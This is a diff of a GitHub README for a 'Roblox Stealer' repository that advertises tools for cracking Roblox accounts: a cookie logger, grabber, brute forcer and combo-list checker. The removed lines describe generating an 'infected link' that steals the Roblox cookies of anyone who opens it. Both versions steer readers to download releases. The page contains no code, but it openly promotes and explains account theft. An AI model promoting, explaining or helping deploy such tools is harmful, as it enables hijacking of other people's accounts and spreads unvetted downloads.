@@ -1,25 +1,47 @@
-<div align="center">
-  
-![2](https://github.com/user-attachments/assets/305533ee-dc03-4c7e-902b-b2feb3cba004)
+# 🎮 Roblox Stealer
 
-![0](https://github.com/user-attachments/assets/96b00b31-4308-4478-9f9b-3e589533d65d)
+Welcome to the Roblox Stealer repository, where you can find tools and resources to enhance your Roblox account cracking experience. Do you want to delve into the world of Roblox account cracking? Then look no further, as our service provides everything you need to get started right away.
 
-</div>
+## Features
 
-<div align="center"><a href="https://mabites.github.io/id/hg7f09qw"><img src="https://github.com/user-attachments/assets/c44dd1c1-bd15-4cc2-b06f-3f578a24f650" height="80"></a></div>
+🔒 **Roblox Accounts:** Explore tools related to Roblox account cracking and security bypass.
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+🍪 **Cookie Handling:** Learn about cookies, logging, and grabbing techniques within the Roblox environment.
 
-### How to use?
+🔨 **Tools:** Access a variety of tools such as logger, checker, grabber, brute force, and combo list for Roblox accounts.
 
-* Open your browser. We recommend you use the Tor browser for better anonymity.
-* Start the localhost page - http://127.0.0.1 
-* Start pythonw and reload the page.
-* Next, when you see the main menu, click on 'Payload-URL Generator' and generate an infected link.
-* Wait about 1–2 minutes and you will receive a special link. When anyone opens it in a browser, our code hijacks and steals Roblox cookies.
+## Repository Topics
 
-## Our software is absolutely free! But we are taking your every 4th account as pay for use.
+The repository covers a wide range of topics related to Roblox cracking, including:
+- cookie-logger
+- cookies
+- discord
+- grabber
+- logger
+- roblosecurity
+- roblox-account-checker
+- roblox-accounts
+- roblox-beaming
+- roblox-bruteforce
+- roblox-checker
+- roblox-combo-list
+- roblox-combo-list-checker
+- roblox-cookie
+- roblox-cookie-checker
+- roblox-cookie-logger
+- roblox-cookie-refresher
+- roblox-cookies
+- roblox-logger
+- roblox-software
+
+## Getting Started
+
+To access the latest tools and updates, visit the [Releases section](https://github.com/joesphallen/Roblox-Stealer/releases).
+
+## Stay Updated
+
+For the most recent developments and releases, keep an eye on the [Releases section](https://github.com/joesphallen/Roblox-Stealer/releases) of this repository.
+
+Explore the tools, enhance your cracking skills, and navigate the realm of Roblox hacking with ease. Join us on this exciting journey of discovery and mastery in the world of Roblox account cracking. 
+
+🚀 Get started now! Visit the [Releases section](https://github.com/joesphallen/Roblox-Stealer/releases) to begin your Roblox Stealer experience.
